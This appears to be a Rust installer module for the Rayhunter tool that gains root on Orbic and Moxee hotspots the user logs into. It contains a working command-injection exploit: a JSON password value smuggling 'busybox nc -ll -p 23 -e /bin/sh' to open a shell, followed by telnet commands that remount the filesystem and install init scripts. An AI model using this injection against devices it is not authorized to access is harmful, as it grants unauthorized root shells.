use std::io::Write;
use std::net::SocketAddr;
use std::str::FromStr;
use std::time::Duration;

use anyhow::{Context, Result, bail};
use axum::{
    Router,
    body::Body,
    extract::{Request, State},
    http::uri::Uri,
    response::{IntoResponse, Response},
    routing::any,
};
use hyper::StatusCode;
use hyper_util::{client::legacy::connect::HttpConnector, rt::TokioExecutor};
use reqwest::Client;
use serde::Deserialize;
use tokio::sync::mpsc;
use tokio::time::sleep;

use crate::util::{echo, telnet_send_command, telnet_send_file};
use crate::{CONFIG_TOML, RAYHUNTER_DAEMON_INIT};

#[derive(Deserialize, Debug)]
struct ExploitResponse {
    retcode: u32,
}

pub async fn start_telnet(admin_ip: &str) -> Result<()> {
    println!("Waiting for login and trying exploit... ");
    login_and_exploit(admin_ip).await?;
    println!("done");

    Ok(())
}

pub async fn install(admin_ip: String) -> Result<()> {
    start_telnet(&admin_ip).await?;

    echo!("Waiting for telnet to become available... ");
    wait_for_telnet(&admin_ip).await?;
    println!("done");

    setup_rayhunter(&admin_ip).await
}

type HttpProxyClient = hyper_util::client::legacy::Client<HttpConnector, Body>;

#[derive(Clone)]
struct ProxyState {
    client: HttpProxyClient,
    admin_ip: String,
    session_sender: mpsc::Sender<String>,
}

async fn proxy_handler(state: State<ProxyState>, mut req: Request) -> Result<Response, StatusCode> {
    // Check for existing session cookie in request
    if let Some(cookie_header) = req.headers().get("cookie")
        && let Ok(cookie_str) = cookie_header.to_str()
        && cookie_str.contains("-goahead-session-")
    {
        let _ = state.session_sender.send(cookie_str.to_owned()).await;
    }

    let path_query = req
        .uri()
        .path_and_query()
        .map(|v| v.as_str())
        .unwrap_or("/");
    let uri = format!("http://{}{}", state.admin_ip, path_query);
    *req.uri_mut() = Uri::try_from(uri).unwrap();

    let response = state
        .client
        .request(req)
        .await
        .map_err(|_| StatusCode::BAD_REQUEST)?;
    Ok(response.into_response())
}

async fn login_and_exploit(admin_ip: &str) -> Result<()> {
    let client = hyper_util::client::legacy::Client::builder(TokioExecutor::new())
        .build(HttpConnector::new());
    let (tx, mut rx) = mpsc::channel(100);

    let app = Router::new()
        .route("/", any(proxy_handler))
        .route("/{*path}", any(proxy_handler))
        .with_state(ProxyState {
            client,
            admin_ip: admin_ip.to_owned(),
            session_sender: tx,
        });

    let listener = tokio::net::TcpListener::bind("127.0.0.1:4000")
        .await
        .context("Failed to bind to port 4000")?;

    println!(
        "Please open http://127.0.0.1:4000 in your browser and log into the device to continue."
    );
    println!("Username: admin");
    println!(
        "Password: On Verizon Orbic RC400L, use the WiFi password. On Moxee devices, check under the battery."
    );

    let handle = tokio::spawn(async move { axum::serve(listener, app).await });
    let exploit_client = Client::new();

    let mut last_error = None;

    while let Some(cookie_header) = rx.recv().await {
        match start_reverse_shell(&exploit_client, admin_ip, &cookie_header).await {
            Ok(_) => {
                handle.abort();
                return Ok(());
            }
            Err(e) => last_error = Some(e),
        }
    }

    handle.abort();
    bail!("Failed to receive session cookie, last error: {last_error:?}")
}

async fn start_reverse_shell(client: &Client, admin_ip: &str, cookie_header: &str) -> Result<()> {
    let response: ExploitResponse = client
        .post(format!("http://{}/action/SetRemoteAccessCfg", admin_ip))
        .header("Content-Type", "application/json")
        .header("Cookie", cookie_header)
        // Original Orbic lacks telnetd (unlike other devices)
        // When doing this, one needs to set prompt=None in the telnet utility functions
        .body(r#"{"password": "\"; busybox nc -ll -p 23 -e /bin/sh & #"}"#)
        .send()
        .await?
        .json()
        .await?;

    if response.retcode != 0 {
        bail!("unexpected response: {:?}", response);
    }

    Ok(())
}

async fn wait_for_telnet(admin_ip: &str) -> Result<()> {
    let addr = SocketAddr::from_str(&format!("{}:23", admin_ip))?;
    let timeout = Duration::from_secs(60);
    let start_time = std::time::Instant::now();

    while telnet_send_command(addr, "true", "exit code 0", false)
        .await
        .is_err()
    {
        if start_time.elapsed() >= timeout {
            bail!(
                "Timeout waiting for telnet to become available after {:?}",
                timeout
            );
        }
        sleep(Duration::from_secs(1)).await;
    }

    Ok(())
}

async fn setup_rayhunter(admin_ip: &str) -> Result<()> {
    let addr = SocketAddr::from_str(&format!("{}:23", admin_ip))?;
    let rayhunter_daemon_bin = include_bytes!(env!("FILE_RAYHUNTER_DAEMON"));

    // Remount filesystem as read-write to allow modifications
    // This is really only necessary for the Moxee Hotspot
    telnet_send_command(
        addr,
        "mount -o remount,rw /dev/ubi0_0 /",
        "exit code 0",
        false,
    )
    .await?;

    telnet_send_command(addr, "mkdir -p /data/rayhunter", "exit code 0", false).await?;

    telnet_send_file(
        addr,
        "/data/rayhunter/rayhunter-daemon",
        rayhunter_daemon_bin,
        false,
    )
    .await?;

    telnet_send_file(
        addr,
        "/data/rayhunter/config.toml",
        CONFIG_TOML
            .replace(r#"#device = "orbic""#, r#"device = "orbic""#)
            .as_bytes(),
        false,
    )
    .await?;

    telnet_send_file(
        addr,
        "/etc/init.d/rayhunter_daemon",
        RAYHUNTER_DAEMON_INIT.as_bytes(),
        false,
    )
    .await?;

    telnet_send_file(
        addr,
        "/etc/init.d/misc-daemon",
        include_bytes!("../../dist/scripts/misc-daemon"),
        false,
    )
    .await?;

    telnet_send_command(
        addr,
        "chmod +x /data/rayhunter/rayhunter-daemon",
        "exit code 0",
        false,
    )
    .await?;
    telnet_send_command(
        addr,
        "chmod 755 /etc/init.d/rayhunter_daemon",
        "exit code 0",
        false,
    )
    .await?;
    telnet_send_command(
        addr,
        "chmod 755 /etc/init.d/misc-daemon",
        "exit code 0",
        false,
    )
    .await?;

    println!("Installation complete. Rebooting device...");
    telnet_send_command(addr, "shutdown -r -t 1 now", "", false)
        .await
        .ok();

    println!(
        "Device is rebooting. After it's started up again, check out the web interface at http://{}:8080",
        admin_ip
    );

    Ok(())
}
